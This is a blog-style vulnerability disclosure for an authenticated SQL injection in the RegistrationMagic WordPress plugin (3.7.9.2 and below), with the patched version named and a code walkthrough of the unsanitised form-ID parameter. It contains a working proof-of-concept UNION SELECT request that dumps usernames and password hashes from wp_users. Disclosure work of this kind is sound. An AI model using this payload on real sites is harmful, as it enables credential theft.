---
layout: single
title: RegistrationMagic - Custom Registration Forms <= 3.7.9.2 Authenticated SQL Injection
date: 2017-12-10
categories:
  - security
  - websec
  - disclosure
tags:
  - wordpress
  - registrationmagic
  - sql injection
excerpt: Due to a lack of input sanitisation, arbitrary `SELECT` statements can be executed and the results viewed in the field management page.
---
## Homepage
[https://wordpress.org/plugins/custom-registration-form-builder-with-submission-manager/](https://wordpress.org/plugins/custom-registration-form-builder-with-submission-manager/)

## Overview
Due to a lack of input sanitisation, arbitrary `SELECT` statements can be executed and the results viewed in the field management page.

## CVSS Score
3.0

## CVSS Vector
[(AV:N/AC:M/Au:S/C:P/I:N/A:N/E:H/RL:OF/RC:C)](https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator?vector=(AV:N/AC:M/Au:S/C:P/I:N/A:N/E:H/RL:OF/RC:C))

## Versions Affected
3.7.9.2 and below

## Solution
Update to version 3.7.9.3 or higher

## Proof of Concept
```
GET /wp-admin/admin.php?page=rm_field_manage&rm_form_id=-1+union+select+ID%2C2%2C3%2Cconcat(user_login%2C0x3a%2Cuser_pass)%2Cconcat(0x54%2C0x65%2C0x78%2C0x74%2C0x62%2C0x6f%2C0x78)%2C6%2C7%2C8%2C9%2C10%2C11+from+wp_users
```

## WordPress Exploit Framework Module
[auxiliary/hash_dump/registrationmagic\_hash\_dump](https://github.com/rastating/wordpress-exploit-framework/blob/development/lib/wpxf/modules/auxiliary/hash_dump/registrationmagic_hash_dump.rb)

## Technical Overview
On line 169 of `admin/controllers/class_rm_field_controller.php`, a call is made into `get_all_form_fields`, passing in the value of the `rm_form_id` field, with no sanitisation:

```php
if (isset($request->req['rm_form_id']))
    $fields_data = $service->get_all_form_fields($request->req['rm_form_id']);
else
    die(RM_UI_Strings::get('MSG_NO_FORM_SELECTED'));
```

Once in `get_all_form_fields` (found on line 884 of `services/class_rm_services.php`), the code then calls out to `RM_DBManager::get_fields_by_form_id`, again, passing the unsanitised data into the next function:

```php
public function get_all_form_fields($form_id) {
    if ((int) $form_id)
        return RM_DBManager::get_fields_by_form_id($form_id);
    else
        return false;
}
```

Now, on line 186 of `includes/class_rm_dbmanager.php`, within the `get_fields_by_form_id` function, the unsanitised data (`$form_id`) is used in the construction of an SQL query:

```php
$results = $wpdb->get_results("SELECT * FROM `$table_name` WHERE `$foreign_key` = $form_id ORDER BY `page_no` ASC, `field_order` ASC");
```

Data from any table can now be retrieved by using a `UNION` statement in the value passed via `$form_id`. The schema for the `wp_rm_fields` table. that it selects from. contains 11 columns:

```
+-------------------------+-----------------+------+-----+---------+----------------+
| Field                   | Type            | Null | Key | Default | Extra          |
+-------------------------+-----------------+------+-----+---------+----------------+
| field_id                | int(6) unsigned | NO   | PRI | NULL    | auto_increment |
| form_id                 | int(6)          | YES  |     | NULL    |                |
| page_no                 | int(6) unsigned | NO   |     | 1       |                |
| field_label             | text            | YES  |     | NULL    |                |
| field_type              | text            | YES  |     | NULL    |                |
| field_value             | mediumtext      | YES  |     | NULL    |                |
| field_order             | int(6)          | YES  |     | NULL    |                |
| field_show_on_user_page | tinyint(1)      | YES  |     | NULL    |                |
| is_field_primary        | tinyint(1)      | NO   |     | 0       |                |
| field_is_editable       | tinyint(1)      | NO   |     | 0       |                |
| field_options           | mediumtext      | YES  |     | NULL    |                |
+-------------------------+-----------------+------+-----+---------+----------------+
```

The fourth column will be displayed in the output of the field management page, so data to be read should be placed here. In addition to this, the fifth field, `field_type`, must match one of a number of white listed values.

On lines 187-188 of `admin/controllers/class_rm_field_controller.php`, each row is processed, and the value of the `field_type` column (the fifth column), is checked against the array returned by `get_field_types`, found in `includes/class_rm_utilities.php`:

```php
public static function get_field_types($include_widgets= true) {
    $field_types = array(
        null => 'Select A Field',
        'Textbox' => 'Text',
        'Select' => 'Drop Down',
        'Radio' => 'Radio Button',
        'Textarea' => 'Textarea',
        'Checkbox' => 'Checkbox',
        'jQueryUIDate' => 'Date',
        'Email' => 'Email',
        'Number' => 'Number',
        'Country' => 'Country',
        'Timezone' => 'Timezone',
        'Terms' => 'T&C Checkbox',
        'Price' => 'Product',
        'Fname' => 'First Name',
        'Lname' => 'Last Name',
        'BInfo' => 'Biographical Info',
        'Nickname' => 'Nickname',
        'Password' => 'Password',
        'Website' => 'Website',
        'Hidden' => 'Hidden Field'
    );

    if($include_widgets){
        $field_types= array_merge($field_types,array('Timer'=>'Timer','RichText'=>'Rich Text',
                                 'Divider'=>'Divider','Spacing'=>'Spacing','HTMLP'=>'Paragraph',
                                  'HTMLH'=>'Heading','Link'=>'Link','YouTubeV'=>'YouTube Video',"Iframe"=>"Embed Iframe"));
    }

    return $field_types;
}
```

Providing the value in the fifth column matches one of these values (e.g. `concat(0x54,0x65,0x78,0x74,0x62,0x6f,0x78)`, as found in the POC), the row will be displayed as a field in the resulting markup:

![SQLi Output](/assets/images/registrationmagic-custom-registration-forms-3-7-9-2-authenticated-sql-injection/output.png)


## WPVDB-ID
[8975](https://wpvulndb.com/vulnerabilities/8975)

## Disclosure Timeline
* **2017-10-04**: Initial discovery
* **2017-12-10**: Released public disclosure
